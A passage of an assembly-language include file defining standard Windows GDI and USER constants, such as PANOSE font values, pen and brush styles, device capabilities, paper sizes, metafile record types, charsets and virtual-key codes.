PAN_STRAIGHT_ARMS_WEDGE equ 3
PAN_STRAIGHT_ARMS_VERT equ 4
PAN_STRAIGHT_ARMS_SINGLE_SERIF equ 5
PAN_STRAIGHT_ARMS_DOUBLE_SERIF equ 6
PAN_BENT_ARMS_HORZ equ 7
PAN_BENT_ARMS_WEDGE equ 8
PAN_BENT_ARMS_VERT equ 9
PAN_BENT_ARMS_SINGLE_SERIF equ 10
PAN_BENT_ARMS_DOUBLE_SERIF equ 11
PAN_LETT_NORMAL_CONTACT equ 2
PAN_LETT_NORMAL_WEIGHTED equ 3
PAN_LETT_NORMAL_BOXED equ 4
PAN_LETT_NORMAL_FLATTENED equ 5
PAN_LETT_NORMAL_ROUNDED equ 6
PAN_LETT_NORMAL_OFF_CENTER equ 7
PAN_LETT_NORMAL_SQUARE equ 8
PAN_LETT_OBLIQUE_CONTACT equ 9
PAN_LETT_OBLIQUE_WEIGHTED equ 10
PAN_LETT_OBLIQUE_BOXED equ 11
PAN_LETT_OBLIQUE_FLATTENED equ 12
PAN_LETT_OBLIQUE_ROUNDED equ 13
PAN_LETT_OBLIQUE_OFF_CENTER equ 14
PAN_LETT_OBLIQUE_SQUARE equ 15
PAN_MIDLINE_STANDARD_TRIMMED equ 2
PAN_MIDLINE_STANDARD_POINTED equ 3
PAN_MIDLINE_STANDARD_SERIFED equ 4
PAN_MIDLINE_HIGH_TRIMMED equ 5
PAN_MIDLINE_HIGH_POINTED equ 6
PAN_MIDLINE_HIGH_SERIFED equ 7
PAN_MIDLINE_CONSTANT_TRIMMED equ 8
PAN_MIDLINE_CONSTANT_POINTED equ 9
PAN_MIDLINE_CONSTANT_SERIFED equ 10
PAN_MIDLINE_LOW_TRIMMED equ 11
PAN_MIDLINE_LOW_POINTED equ 12
PAN_MIDLINE_LOW_SERIFED equ 13
PAN_XHEIGHT_CONSTANT_SMALL equ 2
PAN_XHEIGHT_CONSTANT_STD equ 3
PAN_XHEIGHT_CONSTANT_LARGE equ 4
PAN_XHEIGHT_DUCKING_SMALL equ 5
PAN_XHEIGHT_DUCKING_STD equ 6
PAN_XHEIGHT_DUCKING_LARGE equ 7
ELF_VENDOR_SIZE equ 4
ELF_VERSION equ 0
ELF_CULTURE_LATIN equ 0
RASTER_FONTTYPE equ 1h
DEVICE_FONTTYPE equ 2h
TRUETYPE_FONTTYPE equ 4h
PC_RESERVED equ 1h
PC_EXPLICIT equ 2h
PC_NOCOLLAPSE equ 4h
TRANSPARENT equ 1
OPAQUE equ 2
BKMODE_LAST equ 2
GM_COMPATIBLE equ 1
GM_ADVANCED equ 2
GM_LAST equ 2
PT_CLOSEFIGURE equ 1h
PT_LINETO equ 2h
PT_BEZIERTO equ 4h
PT_MOVETO equ 6h
MM_TEXT equ 1
MM_LOMETRIC equ 2
MM_HIMETRIC equ 3
MM_LOENGLISH equ 4
MM_HIENGLISH equ 5
MM_TWIPS equ 6
MM_ISOTROPIC equ 7
MM_ANISOTROPIC equ 8
MM_MIN equ MM_TEXT
MM_MAX equ MM_ANISOTROPIC
MM_MAX_FIXEDSCALE equ MM_TWIPS
_ABSOLUTE equ 1
RELATIVE equ 2
WHITE_BRUSH equ 0
LTGRAY_BRUSH equ 1
GRAY_BRUSH equ 2
DKGRAY_BRUSH equ 3
BLACK_BRUSH equ 4
NULL_BRUSH equ 5
HOLLOW_BRUSH equ NULL_BRUSH
WHITE_PEN equ 6
BLACK_PEN equ 7
NULL_PEN equ 8
OEM_FIXED_FONT equ 10
ANSI_FIXED_FONT equ 11
ANSI_VAR_FONT equ 12
SYSTEM_FONT equ 13
DEVICE_DEFAULT_FONT equ 14
DEFAULT_PALETTE equ 15
SYSTEM_FIXED_FONT equ 16
STOCK_LAST equ 16
CLR_INVALID equ 0FFFFh
BS_SOLID equ 0
BS_NULL equ 1
BS_HOLLOW equ BS_NULL
BS_HATCHED equ 2
BS_PATTERN equ 3
BS_INDEXED equ 4
BS_DIBPATTERN equ 5
BS_DIBPATTERNPT equ 6
BS_PATTERN8X8 equ 7
BS_DIBPATTERN8X8 equ 8
HS_HORIZONTAL equ 0
HS_VERTICAL equ 1
HS_FDIAGONAL equ 2
HS_BDIAGONAL equ 3
HS_CROSS equ 4
HS_DIAGCROSS equ 5
HS_FDIAGONAL1 equ 6
HS_BDIAGONAL1 equ 7
HS_SOLID equ 8
HS_DENSE1 equ 9
HS_DENSE2 equ 10
HS_DENSE3 equ 11
HS_DENSE4 equ 12
HS_DENSE5 equ 13
HS_DENSE6 equ 14
HS_DENSE7 equ 15
HS_DENSE8 equ 16
HS_NOSHADE equ 17
HS_HALFTONE equ 18
HS_SOLIDCLR equ 19
HS_DITHEREDCLR equ 20
HS_SOLIDTEXTCLR equ 21
HS_DITHEREDTEXTCLR equ 22
HS_SOLIDBKCLR equ 23
HS_DITHEREDBKCLR equ 24
HS_API_MAX equ 25
PS_SOLID equ 0
PS_DASH equ 1
PS_DOT equ 2
PS_DASHDOT equ 3
PS_DASHDOTDOT equ 4
PS_NULL equ 5
PS_INSIDEFRAME equ 6
PS_USERSTYLE equ 7
PS_ALTERNATE equ 8
PS_STYLE_MASK equ 0Fh
PS_ENDCAP_ROUND equ 0h
PS_ENDCAP_SQUARE equ 100h
PS_ENDCAP_FLAT equ 200h
PS_ENDCAP_MASK equ 0F00h
PS_JOIN_ROUND equ 0h
PS_JOIN_BEVEL equ 1000h
PS_JOIN_MITER equ 2000h
PS_JOIN_MASK equ 0F000h
PS_COSMETIC equ 0h
PS_GEOMETRIC equ 10000h
PS_TYPE_MASK equ 0F0000h
AD_COUNTERCLOCKWISE equ 1
AD_CLOCKWISE equ 2
PRF_CHECKVISIBLE equ 00000001h
PRF_NONCLIENT equ 00000002h
PRF_CLIENT equ 00000004h
PRF_ERASEBKGND equ 00000008h
PRF_CHILDREN equ 00000010h
PRF_OWNED equ 00000020h
BDR_RAISEDOUTER equ 0001h
BDR_SUNKENOUTER equ 0002h
BDR_RAISEDINNER equ 0004h
BDR_SUNKENINNER equ 0008h
BDR_OUTER equ 0003h
BDR_INNER equ 000Ch
BDR_RAISED equ 0005h
BDR_SUNKEN equ 000Ah
EDGE_RAISED equ BDR_RAISEDOUTER|BDR_RAISEDINNER
EDGE_SUNKEN equ BDR_SUNKENOUTER|BDR_SUNKENINNER
EDGE_ETCHED equ BDR_SUNKENOUTER|BDR_RAISEDINNER
EDGE_BUMP equ BDR_RAISEDOUTER|BDR_SUNKENINNER
BF_LEFT equ 0001h
BF_TOP equ 0002h
BF_RIGHT equ 0004h
BF_BOTTOM equ 0008h
BF_TOPLEFT equ BF_TOP|BF_LEFT
BF_TOPRIGHT equ BF_TOP|BF_RIGHT
BF_BOTTOMLEFT equ BF_BOTTOM|BF_LEFT
BF_BOTTOMRIGHT equ BF_BOTTOM|BF_RIGHT
BF_RECT equ BF_LEFT|BF_TOP|BF_RIGHT|BF_BOTTOM
BF_DIAGONAL equ 0010h
BF_DIAGONAL_ENDTOPRIGHT equ BF_DIAGONAL|BF_TOP|BF_RIGHT
BF_DIAGONAL_ENDTOPLEFT equ BF_DIAGONAL|BF_TOP|BF_LEFT
BF_DIAGONAL_ENDBOTTOMLEFT equ BF_DIAGONAL|BF_BOTTOM|BF_LEFT
BF_DIAGONAL_ENDBOTTOMRIGHT equ BF_DIAGONAL|BF_BOTTOM|BF_RIGHT
BF_MIDDLE equ 0800h
BF_SOFT equ 1000h
BF_ADJUST equ 2000h
BF_FLAT equ 4000h
BF_MONO equ 8000h
DRIVERVERSION equ 0
TECHNOLOGY equ 2
HORZSIZE equ 4
VERTSIZE equ 6
HORZRES equ 8
VERTRES equ 10
BITSPIXEL equ 12
PLANES equ 14
NUMBRUSHES equ 16
NUMPENS equ 18
NUMMARKERS equ 20
NUMFONTS equ 22
NUMCOLORS equ 24
PDEVICESIZE equ 26
CURVECAPS equ 28
LINECAPS equ 30
POLYGONALCAPS equ 32
TEXTCAPS equ 34
CLIPCAPS equ 36
RASTERCAPS equ 38
ASPECTX equ 40
ASPECTY equ 42
ASPECTXY equ 44
LOGPIXELSX equ 88
LOGPIXELSY equ 90
SIZEPALETTE equ 104
NUMRESERVED equ 106
COLORRES equ 108
PHYSICALWIDTH equ 110
PHYSICALHEIGHT equ 111
PHYSICALOFFSETX equ 112
PHYSICALOFFSETY equ 113
SCALINGFACTORX equ 114
SCALINGFACTORY equ 115
DT_PLOTTER equ 0
DT_RASDISPLAY equ 1
DT_RASPRINTER equ 2
DT_RASCAMERA equ 3
DT_CHARSTREAM equ 4
DT_METAFILE equ 5
DT_DISPFILE equ 6
CC_NONE equ 0
CC_CIRCLES equ 1
CC_PIE equ 2
CC_CHORD equ 4
CC_ELLIPSES equ 8
CC_WIDE equ 16
CC_STYLED equ 32
CC_WIDESTYLED equ 64
CC_INTERIORS equ 128
CC_ROUNDRECT equ 256
LC_NONE equ 0
LC_POLYLINE equ 2
LC_MARKER equ 4
LC_POLYMARKER equ 8
LC_WIDE equ 16
LC_STYLED equ 32
LC_WIDESTYLED equ 64
LC_INTERIORS equ 128
PC_NONE equ 0
PC_POLYGON equ 1
PC_RECTANGLE equ 2
PC_WINDPOLYGON equ 4
PC_TRAPEZOID equ 4
PC_SCANLINE equ 8
PC_WIDE equ 16
PC_STYLED equ 32
PC_WIDESTYLED equ 64
PC_INTERIORS equ 128
CP_NONE equ 0
CP_RECTANGLE equ 1
CP_REGION equ 2
TC_OP_CHARACTER equ 1h
TC_OP_STROKE equ 2h
TC_CP_STROKE equ 4h
TC_CR_90 equ 8h
TC_CR_ANY equ 10h
TC_SF_X_YINDEP equ 20h
TC_SA_DOUBLE equ 40h
TC_SA_INTEGER equ 80h
TC_SA_CONTIN equ 100h
TC_EA_DOUBLE equ 200h
TC_IA_ABLE equ 400h
TC_UA_ABLE equ 800h
TC_SO_ABLE equ 1000h
TC_RA_ABLE equ 2000h
TC_VA_ABLE equ 4000h
TC_RESERVED equ 8000h
TC_SCROLLBLT equ 10000h
RC_NONE equ 0
RC_BITBLT equ 1
RC_BANDING equ 2
RC_SCALING equ 4
RC_BITMAP64 equ 8
RC_GDI20_OUTPUT equ 10h
RC_GDI20_STATE equ 20h
RC_SAVEBITMAP equ 40h
RC_DI_BITMAP equ 80h
RC_PALETTE equ 100h
RC_DIBTODEV equ 200h
RC_BIGFONT equ 400h
RC_STRETCHBLT equ 800h
RC_FLOODFILL equ 1000h
RC_STRETCHDIB equ 2000h
RC_OP_DX_OUTPUT equ 4000h
RC_DEVBITS equ 8000h
DIB_RGB_COLORS equ 0
DIB_PAL_COLORS equ 1
DIB_PAL_INDICES equ 2
DIB_PAL_PHYSINDICES equ 2
DIB_PAL_LOGINDICES equ 4
SYSPAL_ERROR equ 0
SYSPAL_STATIC equ 1
SYSPAL_NOSTATIC equ 2
CBM_CREATEDIB equ 2h
CBM_INIT equ 4h
FLOODFILLBORDER equ 0
FLOODFILLSURFACE equ 1
CCHDEVICENAME equ 32
CCHFORMNAME equ 32
DM_SPECVERSION equ 320h
DM_ORIENTATION equ 1h
DM_PAPERSIZE equ 2h
DM_PAPERLENGTH equ 4h
DM_PAPERWIDTH equ 8h
DM_SCALE equ 10h
DM_COPIES equ 100h
DM_DEFAULTSOURCE equ 200h
DM_PRINTQUALITY equ 400h
DM_COLOR equ 800h
DM_DUPLEX equ 1000h
DM_YRESOLUTION equ 2000h
DM_TTOPTION equ 4000h
DM_COLLATE equ 8000h
DM_FORMNAME equ 10000h
DMORIENT_PORTRAIT equ 1
DMORIENT_LANDSCAPE equ 2
DMPAPER_LETTER equ 1
DMPAPER_FIRST equ DMPAPER_LETTER
DMPAPER_LETTERSMALL equ 2
DMPAPER_TABLOID equ 3
DMPAPER_LEDGER equ 4
DMPAPER_LEGAL equ 5
DMPAPER_STATEMENT equ 6
DMPAPER_EXECUTIVE equ 7
DMPAPER_A3 equ 8
DMPAPER_A4 equ 9
DMPAPER_A4SMALL equ 10
DMPAPER_A5 equ 11
DMPAPER_B4 equ 12
DMPAPER_B5 equ 13
DMPAPER_FOLIO equ 14
DMPAPER_QUARTO equ 15
DMPAPER_10X14 equ 16
DMPAPER_11X17 equ 17
DMPAPER_NOTE equ 18
DMPAPER_ENV_9 equ 19
DMPAPER_ENV_10 equ 20
DMPAPER_ENV_11 equ 21
DMPAPER_ENV_12 equ 22
DMPAPER_ENV_14 equ 23
DMPAPER_CSHEET equ 24
DMPAPER_DSHEET equ 25
DMPAPER_ESHEET equ 26
DMPAPER_ENV_DL equ 27
DMPAPER_ENV_C5 equ 28
DMPAPER_ENV_C3 equ 29
DMPAPER_ENV_C4 equ 30
DMPAPER_ENV_C6 equ 31
DMPAPER_ENV_C65 equ 32
DMPAPER_ENV_B4 equ 33
DMPAPER_ENV_B5 equ 34
DMPAPER_ENV_B6 equ 35
DMPAPER_ENV_ITALY equ 36
DMPAPER_ENV_MONARCH equ 37
DMPAPER_ENV_PERSONAL equ 38
DMPAPER_FANFOLD_US equ 39
DMPAPER_FANFOLD_STD_GERMAN equ 40
DMPAPER_FANFOLD_LGL_GERMAN equ 41
DMPAPER_LAST equ DMPAPER_FANFOLD_LGL_GERMAN
DMPAPER_USER equ 256
DMBIN_UPPER equ 1
DMBIN_FIRST equ DMBIN_UPPER
DMBIN_ONLYONE equ 1
DMBIN_LOWER equ 2
DMBIN_MIDDLE equ 3
DMBIN_MANUAL equ 4
DMBIN_ENVELOPE equ 5
DMBIN_ENVMANUAL equ 6
DMBIN_AUTO equ 7
DMBIN_TRACTOR equ 8
DMBIN_SMALLFMT equ 9
DMBIN_LARGEFMT equ 10
DMBIN_LARGECAPACITY equ 11
DMBIN_CASSETTE equ 14
DMBIN_LAST equ DMBIN_CASSETTE
DMBIN_USER equ 256
DMRES_DRAFT equ -1
DMRES_LOW equ -2
DMRES_MEDIUM equ -3
DMRES_HIGH equ -4
DMCOLOR_MONOCHROME equ 1
DMCOLOR_COLOR equ 2
DMDUP_SIMPLEX equ 1
DMDUP_VERTICAL equ 2
DMDUP_HORIZONTAL equ 3
DMTT_BITMAP equ 1
DMTT_DOWNLOAD equ 2
DMTT_SUBDEV equ 3
DMCOLLATE_FALSE equ 0
DMCOLLATE_TRUE equ 1
DM_GRAYSCALE equ 1h
DM_INTERLACED equ 2h
RDH_RECTANGLES equ 1
GGO_METRICS equ 0
GGO_BITMAP equ 1
GGO_NATIVE equ 2
TT_POLYGON_TYPE equ 24
TT_PRIM_LINE equ 1
TT_PRIM_QSPLINE equ 2
TT_AVAILABLE equ 1h
TT_ENABLED equ 2h
DM_UPDATE equ 1
DM_COPY equ 2
DM_PROMPT equ 4
DM_MODIFY equ 8
DM_IN_BUFFER equ DM_MODIFY
DM_IN_PROMPT equ DM_PROMPT
DM_OUT_BUFFER equ DM_COPY
DM_OUT_DEFAULT equ DM_UPDATE
DC_FIELDS equ 1
DC_PAPERS equ 2
DC_PAPERSIZE equ 3
DC_MINEXTENT equ 4
DC_MAXEXTENT equ 5
DC_BINS equ 6
DC_DUPLEX equ 7
DC_SIZE equ 8
DC_EXTRA equ 9
DC_VERSION equ 10
DC_DRIVER equ 11
DC_BINNAMES equ 12
DC_ENUMRESOLUTIONS equ 13
DC_FILEDEPENDENCIES equ 14
DC_TRUETYPE equ 15
DC_PAPERNAMES equ 16
DC_ORIENTATION equ 17
DC_COPIES equ 18
DCTT_BITMAP equ 1h
DCTT_DOWNLOAD equ 2h
DCTT_SUBDEV equ 4h
CA_NEGATIVE equ 1h
CA_LOG_FILTER equ 2h
ILLUMINANT_DEVICE_DEFAULT equ 0
ILLUMINANT_A equ 1
ILLUMINANT_B equ 2
ILLUMINANT_C equ 3
ILLUMINANT_D50 equ 4
ILLUMINANT_D55 equ 5
ILLUMINANT_D65 equ 6
ILLUMINANT_D75 equ 7
ILLUMINANT_F2 equ 8
ILLUMINANT_MAX_INDEX equ ILLUMINANT_F2
ILLUMINANT_TUNGSTEN equ ILLUMINANT_A
ILLUMINANT_DAYLIGHT equ ILLUMINANT_C
ILLUMINANT_FLUORESCENT equ ILLUMINANT_F2
ILLUMINANT_NTSC equ ILLUMINANT_C
RGB_GAMMA_MIN equ 2500
RGB_GAMMA_MAX equ 65000
REFERENCE_WHITE_MIN equ 6000
REFERENCE_WHITE_MAX equ 10000
REFERENCE_BLACK_MIN equ 0
REFERENCE_BLACK_MAX equ 4000
COLOR_ADJ_MIN equ -100
COLOR_ADJ_MAX equ 100
FONTMAPPER_MAX equ 10
ENHMETA_SIGNATURE equ 464D4520h
ENHMETA_STOCK_OBJECT equ 80000000h
EMR_HEADER equ 1
EMR_POLYBEZIER equ 2
EMR_POLYGON equ 3
EMR_POLYLINE equ 4
EMR_POLYBEZIERTO equ 5
EMR_POLYLINETO equ 6
EMR_POLYPOLYLINE equ 7
EMR_POLYPOLYGON equ 8
EMR_SETWINDOWEXTEX equ 9
EMR_SETWINDOWORGEX equ 10
EMR_SETVIEWPORTEXTEX equ 11
EMR_SETVIEWPORTORGEX equ 12
EMR_SETBRUSHORGEX equ 13
EMR_EOF equ 14
EMR_SETPIXELV equ 15
EMR_SETMAPPERFLAGS equ 16
EMR_SETMAPMODE equ 17
EMR_SETBKMODE equ 18
EMR_SETPOLYFILLMODE equ 19
EMR_SETROP2 equ 20
EMR_SETSTRETCHBLTMODE equ 21
EMR_SETTEXTALIGN equ 22
EMR_SETCOLORADJUSTMENT equ 23
EMR_SETTEXTCOLOR equ 24
EMR_SETBKCOLOR equ 25
EMR_OFFSETCLIPRGN equ 26
EMR_MOVETOEX equ 27
EMR_SETMETARGN equ 28
EMR_EXCLUDECLIPRECT equ 29
EMR_INTERSECTCLIPRECT equ 30
EMR_SCALEVIEWPORTEXTEX equ 31
EMR_SCALEWINDOWEXTEX equ 32
EMR_SAVEDC equ 33
EMR_RESTOREDC equ 34
EMR_SETWORLDTRANSFORM equ 35
EMR_MODIFYWORLDTRANSFORM equ 36
EMR_SELECTOBJECT equ 37
EMR_CREATEPEN equ 38
EMR_CREATEBRUSHINDIRECT equ 39
EMR_DELETEOBJECT equ 40
EMR_ANGLEARC equ 41
EMR_ELLIPSE equ 42
EMR_RECTANGLE equ 43
EMR_ROUNDRECT equ 44
EMR_ARC equ 45
EMR_CHORD equ 46
EMR_PIE equ 47
EMR_SELECTPALETTE equ 48
EMR_CREATEPALETTE equ 49
EMR_SETPALETTEENTRIES equ 50
EMR_RESIZEPALETTE equ 51
EMR_REALIZEPALETTE equ 52
EMR_EXTFLOODFILL equ 53
EMR_LINETO equ 54
EMR_ARCTO equ 55
EMR_POLYDRAW equ 56
EMR_SETARCDIRECTION equ 57
EMR_SETMITERLIMIT equ 58
EMR_BEGINPATH equ 59
EMR_ENDPATH equ 60
EMR_CLOSEFIGURE equ 61
EMR_FILLPATH equ 62
EMR_STROKEANDFILLPATH equ 63
EMR_STROKEPATH equ 64
EMR_FLATTENPATH equ 65
EMR_WIDENPATH equ 66
EMR_SELECTCLIPPATH equ 67
EMR_ABORTPATH equ 68
EMR_GDICOMMENT equ 70
EMR_FILLRGN equ 71
EMR_FRAMERGN equ 72
EMR_INVERTRGN equ 73
EMR_PAINTRGN equ 74
EMR_EXTSELECTCLIPRGN equ 75
EMR_BITBLT equ 76
EMR_STRETCHBLT equ 77
EMR_MASKBLT equ 78
EMR_PLGBLT equ 79
EMR_SETDIBITSTODEVICE equ 80
EMR_STRETCHDIBITS equ 81
EMR_EXTCREATEFONTINDIRECTW equ 82
EMR_EXTTEXTOUTA equ 83
EMR_EXTTEXTOUTW equ 84
EMR_POLYBEZIER16 equ 85
EMR_POLYGON16 equ 86
EMR_POLYLINE16 equ 87
EMR_POLYBEZIERTO16 equ 88
EMR_POLYLINETO16 equ 89
EMR_POLYPOLYLINE16 equ 90
EMR_POLYPOLYGON16 equ 91
EMR_POLYDRAW16 equ 92
EMR_CREATEMONOBRUSH equ 93
EMR_CREATEDIBPATTERNBRUSHPT equ 94
EMR_EXTCREATEPEN equ 95
EMR_POLYTEXTOUTA equ 96
EMR_POLYTEXTOUTW equ 97
EMR_MIN equ 1
EMR_MAX equ 97
STRETCH_ANDSCANS equ 1
STRETCH_ORSCANS equ 2
STRETCH_DELETESCANS equ 3
STRETCH_HALFTONE equ 4
TCI_SRCCHARSET equ 1
TCI_SRCCODEPAGE equ 2
TCI_SRCFONTSIG equ 3
MONO_FONT equ 8
JOHAB_CHARSET equ 130
HEBREW_CHARSET equ 177
ARABIC_CHARSET equ 178
GREEK_CHARSET equ 161
TURKISH_CHARSET equ 162
THAI_CHARSET equ 222
EASTEUROPE_CHARSET equ 238
RUSSIAN_CHARSET equ 204
MAC_CHARSET equ 77
BALTIC_CHARSET equ 186
FS_LATIN1 equ 1h
FS_LATIN2 equ 2h
FS_CYRILLIC equ 4h
FS_GREEK equ 8h
FS_TURKISH equ 10h
FS_HEBREW equ 20h
FS_ARABIC equ 40h
FS_BALTIC equ 80h
FS_THAI equ 10000h
FS_JISJAPAN equ 20000h
FS_CHINESESIMP equ 40000h
FS_WANSUNG equ 80000h
FS_CHINESETRAD equ 100000h
FS_JOHAB equ 200000h
FS_SYMBOL equ 80000000h
DEFAULT_GUI_FONT equ 17
DM_RESERVED1 equ 800000h
DM_RESERVED2 equ 1000000h
DM_ICMMETHOD equ 2000000h
DM_ICMINTENT equ 4000000h
DM_MEDIATYPE equ 8000000h
DM_DITHERTYPE equ 10000000h
DMPAPER_ISO_B4 equ 42
DMPAPER_JAPANESE_POSTCARD equ 43
DMPAPER_9X11 equ 44
DMPAPER_10X11 equ 45
DMPAPER_15X11 equ 46
DMPAPER_ENV_INVITE equ 47
DMPAPER_RESERVED_48 equ 48
DMPAPER_RESERVED_49 equ 49
DMPAPER_LETTER_EXTRA equ 50
DMPAPER_LEGAL_EXTRA equ 51
DMPAPER_TABLOID_EXTRA equ 52
DMPAPER_A4_EXTRA equ 53
DMPAPER_LETTER_TRANSVERSE equ 54
DMPAPER_A4_TRANSVERSE equ 55
DMPAPER_LETTER_EXTRA_TRANSVERSE equ 56
DMPAPER_A_PLUS equ 57
DMPAPER_B_PLUS equ 58
DMPAPER_LETTER_PLUS equ 59
DMPAPER_A4_PLUS equ 60
DMPAPER_A5_TRANSVERSE equ 61
DMPAPER_B5_TRANSVERSE equ 62
DMPAPER_A3_EXTRA equ 63
DMPAPER_A5_EXTRA equ 64
DMPAPER_B5_EXTRA equ 65
DMPAPER_A2 equ 66
DMPAPER_A3_TRANSVERSE equ 67
DMPAPER_A3_EXTRA_TRANSVERSE equ 68
DMTT_DOWNLOAD_OUTLINE equ 4
DMICMMETHOD_NONE equ 1
DMICMMETHOD_SYSTEM equ 2
DMICMMETHOD_DRIVER equ 3
DMICMMETHOD_DEVICE equ 4
DMICMMETHOD_USER equ 256
DMICM_SATURATE equ 1
DMICM_CONTRAST equ 2
DMICM_COLORMETRIC equ 3
DMICM_USER equ 256
DMMEDIA_STANDARD equ 1
DMMEDIA_GLOSSY equ 2
DMMEDIA_TRANSPARENCY equ 3
DMMEDIA_USER equ 256
DMDITHER_NONE equ 1
DMDITHER_COARSE equ 2
DMDITHER_FINE equ 3
DMDITHER_LINEART equ 4
DMDITHER_GRAYSCALE equ 5
DMDITHER_USER equ 256
GGO_GRAY2_BITMAP equ 4
GGO_GRAY4_BITMAP equ 5
GGO_GRAY8_BITMAP equ 6
GGO_GLYPH_INDEX equ 80h
GCP_DBCS equ 1h
GCP_REORDER equ 2h
GCP_USEKERNING equ 8h
GCP_GLYPHSHAPE equ 10h
GCP_LIGATE equ 20h
GCP_DIACRITIC equ 100h
GCP_KASHIDA equ 400h
GCP_ERROR equ 8000h
FLI_MASK equ 103Bh
GCP_JUSTIFY equ 10000h
GCP_NODIACRITICS equ 20000h
FLI_GLYPHS equ 40000h
GCP_CLASSIN equ 80000h
GCP_MAXEXTENT equ 100000h
GCP_JUSTIFYIN equ 200000h
GCP_DISPLAYZWG equ 400000h
GCP_SYMSWAPOFF equ 800000h
GCP_NUMERICOVERRIDE equ 1000000h
GCP_NEUTRALOVERRIDE equ 2000000h
GCP_NUMERICSLATIN equ 4000000h
GCP_NUMERICSLOCAL equ 8000000h
GCPCLASS_LATIN equ 1
GCPCLASS_HEBREW equ 2
GCPCLASS_ARABIC equ 2
GCPCLASS_NEUTRAL equ 3
GCPCLASS_LOCALNUMBER equ 4
GCPCLASS_LATINNUMBER equ 5
GCPCLASS_LATINNUMERICTERMINATOR equ 6
GCPCLASS_LATINNUMERICSEPARATOR equ 7
GCPCLASS_NUMERICSEPARATOR equ 8
GCPCLASS_PREBOUNDRTL equ 80h
GCPCLASS_PREBOUNDLTR equ 40h
DC_BINADJUST equ 19
DC_EMF_COMPLIANT equ 20
DC_DATATYPE_PRODUCED equ 21
DC_COLLATE equ 22
DCTT_DOWNLOAD_OUTLINE equ 8h
DCBA_FACEUPNONE equ 0h
DCBA_FACEUPCENTER equ 1h
DCBA_FACEUPLEFT equ 2h
DCBA_FACEUPRIGHT equ 3h
DCBA_FACEDOWNNONE equ 100h
DCBA_FACEDOWNCENTER equ 101h
DCBA_FACEDOWNLEFT equ 102h
DCBA_FACEDOWNRIGHT equ 103h
ICM_OFF equ 1
ICM_ON equ 2
ICM_QUERY equ 3
EMR_SETICMMODE equ 98
EMR_CREATECOLORSPACE equ 99
EMR_SETCOLORSPACE equ 100
EMR_DELETECOLORSPACE equ 101
SB_HORZ equ 0
SB_VERT equ 1
SB_CTL equ 2
SB_BOTH equ 3
SB_LINEUP equ 0
SB_LINELEFT equ 0
SB_LINEDOWN equ 1
SB_LINERIGHT equ 1
SB_PAGEUP equ 2
SB_PAGELEFT equ 2
SB_PAGEDOWN equ 3
SB_PAGERIGHT equ 3
SB_THUMBPOSITION equ 4
SB_THUMBTRACK equ 5
SB_TOP equ 6
SB_LEFT equ 6
SB_BOTTOM equ 7
SB_RIGHT equ 7
SB_ENDSCROLL equ 8
SBM_SETSCROLLINFO equ 00E9h
SBM_GETSCROLLINFO equ 00EAh
SIF_RANGE equ 0001h
SIF_PAGE equ 0002h
SIF_POS equ 0004h
SIF_DISABLENOSCROLL equ 0008h
SIF_TRACKPOS equ 0010h
SIF_ALL equ SIF_RANGE|SIF_PAGE|SIF_POS|SIF_TRACKPOS
SW_HIDE equ 0
SW_SHOWNORMAL equ 1
SW_NORMAL equ 1
SW_SHOWMINIMIZED equ 2
SW_SHOWMAXIMIZED equ 3
SW_MAXIMIZE equ 3
SW_SHOWNOACTIVATE equ 4
SW_SHOW equ 5
SW_MINIMIZE equ 6
SW_SHOWMINNOACTIVE equ 7
SW_SHOWNA equ 8
SW_RESTORE equ 9
SW_SHOWDEFAULT equ 10
SW_MAX equ 10
HIDE_WINDOW equ 0
SHOW_OPENWINDOW equ 1
SHOW_ICONWINDOW equ 2
SHOW_FULLSCREEN equ 3
SHOW_OPENNOACTIVATE equ 4
SW_PARENTCLOSING equ 1
SW_OTHERZOOM equ 2
SW_PARENTOPENING equ 3
SW_OTHERUNZOOM equ 4
KF_EXTENDED equ 100h
KF_DLGMODE equ 800h
KF_MENUMODE equ 1000h
KF_ALTDOWN equ 2000h
KF_REPEAT equ 4000h
KF_UP equ 8000h
VK_BACK equ 8h
VK_CANCEL equ 3h
VK_CAPITAL equ 14h
VK_CLEAR equ 0Ch
VK_CONTROL equ 11h
VK_DELETE equ 2Eh
VK_DOWN equ 28h
VK_END equ 23h
VK_ESCAPE equ 1Bh
VK_EXECUTE equ 2Bh
VK_HELP equ 2Fh
VK_HOME equ 24h
VK_INSERT equ 2Dh
VK_LBUTTON equ 1h
VK_LEFT equ 25h
VK_MBUTTON equ 4h
VK_MENU equ 12h
VK_NEXT equ 22h
VK_PAUSE equ 13h
VK_PGDN equ 22h
VK_PGUP equ 21h
VK_PRINT equ 2Ah
VK_PRIOR equ 21h
VK_RBUTTON equ 2h
VK_RETURN equ 0Dh
VK_RIGHT equ 27h
VK_SELECT equ 29h
VK_SHIFT equ 10h
VK_SNAPSHOT equ 2Ch
VK_SPACE equ 20h
VK_TAB equ 9h
VK_UP equ 26h
VK_NUMPAD0 equ 60h
VK_NUMPAD1 equ 61h
VK_NUMPAD2 equ 62h
VK_NUMPAD3 equ 63h
VK_NUMPAD4 equ 64h
VK_NUMPAD5 equ 65h
VK_NUMPAD6 equ 66h
VK_NUMPAD7 equ 67h
VK_NUMPAD8 equ 68h
VK_NUMPAD9 equ 69h
VK_MULTIPLY equ 6Ah
VK_ADD equ 6Bh
VK_SEPARATOR equ 6Ch
VK_SUBTRACT equ 6Dh
VK_DECIMAL equ 6Eh
VK_DIVIDE equ 6Fh
VK_F1 equ 70h
VK_F2 equ 71h
VK_F3 equ 72h
VK_F4 equ 73h
VK_F5 equ 74h
VK_F6 equ 75h
VK_F7 equ 76h
VK_F8 equ 77h
VK_F9 equ 78h
VK_F10 equ 79h
VK_F11 equ 7Ah
VK_F12 equ 7Bh
VK_F13 equ 7Ch
VK_F14 equ 7Dh
VK_F15 equ 7Eh
VK_F16 equ 7Fh
VK_F17 equ 80h
VK_F18 equ 81h
VK_F19 equ 82h
VK_F20 equ 83h
VK_F21 equ 84h
VK_F22 equ 85h
VK_F23 equ 86h
VK_F24 equ 87h
VK_NUMLOCK equ 90h
VK_SCROLL equ 91h
VK_LSHIFT equ 0A0h
VK_RSHIFT equ 0A1h
VK_LCONTROL equ 0A2h
VK_RCONTROL equ 0A3h
VK_LMENU equ 0A4h
VK_RMENU equ 0A5h
VK_ATTN equ 0F6h
VK_CRSEL equ 0F7h
VK_EXSEL equ 0F8h
VK_EREOF equ 0F9h
VK_PLAY equ 0FAh
VK_ZOOM equ 0FBh
VK_NONAME equ 0FCh
VK_PA1 equ 0FDh
VK_OEM_CLEAR equ 0FEh
WH_MIN equ -1
WH_MSGFILTER equ -1
